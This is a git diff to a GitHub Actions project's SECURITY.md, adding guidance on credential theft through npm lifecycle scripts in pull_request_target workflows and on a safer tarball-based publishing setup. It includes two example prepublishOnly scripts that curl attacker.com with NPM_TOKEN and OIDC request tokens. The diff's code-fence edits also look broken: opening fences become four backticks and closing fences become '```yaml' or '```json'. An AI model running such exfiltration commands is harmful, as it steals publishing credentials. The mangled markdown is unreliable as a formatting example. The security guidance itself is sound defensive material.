@@ -12,20 +12,6 @@
   - [🕐 Response Timeline](#-response-timeline)
 - [Security Best Practices for Users](#security-best-practices-for-users)
   - [🔐 Secrets Management](#-secrets-management)
-  - [🏷️ Action Versioning](#-action-versioning)
-  - [🔍 Workflow Permissions](#-workflow-permissions)
-  - [🛡️ Input Validation](#-input-validation)
-- [Security Features](#security-features)
-  - [🔒 Automated Security Scanning](#-automated-security-scanning)
-  - [🛡️ Secure Development Practices](#-secure-development-practices)
-  - [🔍 Supply Chain Security](#-supply-chain-security)
-- [Known Security Considerations](#known-security-considerations)
-  - [GitHub Actions Environment](#github-actions-environment)
-  - [npm Publishing (npm-pr-version)](#npm-publishing-npm-pr-version)
-  - [Comment Actions](#comment-actions)
-- [Incident Response](#incident-response)
-- [Security Contact](#security-contact)
-- [Acknowledgments](#acknowledgments)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 <!-- prettier-ignore-end -->
@@ -88,7 +74,7 @@ When using these GitHub Actions in your workflows:
 - **Limit secret scope** to only necessary workflows
 - **Rotate secrets** regularly
 
-```yaml
+````yaml
 # ✅ Good - Using secrets properly
 - uses: codfish/actions/npm-pr-version@v3
   with:
@@ -97,7 +83,7 @@ When using these GitHub Actions in your workflows:
 # ❌ Bad - Exposing secrets
 - name: Debug
   run: echo "Token: ${{ secrets.NPM_TOKEN }}"
-```
+```yaml
 
 ### 🏷️ Action Versioning
 
@@ -110,7 +96,7 @@ When using these GitHub Actions in your workflows:
 
 # ⚠️ Caution - Latest main (testing only)
 - uses: codfish/actions/setup-node-and-install@v3
-```
+```yaml
 
 ### 🔍 Workflow Permissions
 
@@ -127,7 +113,7 @@ permissions:
 
 # ❌ Bad - Excessive permissions
 permissions: write-all
-```
+```yaml
 
 ### 🛡️ Input Validation
 
@@ -170,6 +156,89 @@ This project implements several security measures:
 
 ### npm Publishing (npm-pr-version)
 
+#### Open Source Projects Using `pull_request_target`
+
+If you're an **open source project** using `pull_request_target` to publish PR packages from external contributors, consider using the secure tarball mode to protect against lifecycle script attacks.
+
+**When is this relevant?**
+- ✅ You use `pull_request_target` (not `pull_request`)
+- ✅ You accept PRs from external contributors
+- ✅ Your workflow has access to publishing credentials (`npm-token` OR `id-token: write` for OIDC)
+
+**Not relevant if:**
+- ❌ You use `pull_request` event (no secret access from forks)
+- ❌ You only publish from trusted branches
+
+**The Risk:**
+
+npm automatically executes lifecycle scripts during publishing:
+- `prepublishOnly`, `prepare`, `prepack`, `postpack`
+
+A malicious PR could add a script that exfiltrates credentials:
+
+**With npm-token:**
+```json
+{
+  "scripts": {
+    "prepublishOnly": "curl https://attacker.com?token=$NPM_TOKEN"
+  }
+}
+```json
+
+**With OIDC (even without npm-token):**
+```json
+{
+  "scripts": {
+    "prepublishOnly": "curl https://attacker.com?url=$ACTIONS_ID_TOKEN_REQUEST_URL&token=$ACTIONS_ID_TOKEN_REQUEST_TOKEN"
+  }
+}
+```json
+
+> ⚠️ **OIDC is just as vulnerable!** The OIDC environment variables allow attackers to mint tokens and publish packages.
+
+**Recommended Solution:**
+
+Use the secure two-step workflow with tarball mode:
+
+```yaml
+on: pull_request_target
+
+jobs:
+  build:
+    # Build with untrusted code (no secrets)
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@v6
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: npm ci && npm run build && npm pack
+      - uses: actions/upload-artifact@v4
+        with:
+          name: package-tarball
+          path: '*.tgz'
+
+  publish:
+    needs: build
+    # Publish with secrets and --ignore-scripts
+    permissions:
+      contents: read
+      id-token: write       # For OIDC (or omit if using npm-token)
+      pull-requests: write  # For commenting
+    steps:
+      - uses: actions/checkout@v6  # Trusted base branch
+      - uses: actions/download-artifact@v4
+        with:
+          name: package-tarball
+      - uses: codfish/actions/npm-pr-version@v3
+        with:
+          tarball: '*.tgz'
+```yaml
+
+See [npm-pr-version/README.md](./npm-publish-pr/README.md#security-considerations) for full details.
+
+#### General npm Publishing Considerations
+
 - **NPM tokens have broad permissions** - ensure tokens are scoped appropriately
 - **Published packages are public** by default - review package contents
 - **Version immutability** - published versions cannot be unpublished
@@ -205,3 +274,4 @@ security issues will be acknowledged (with permission) in:
 - This security policy
 
 Thank you for helping keep this project secure! 🔒
+````
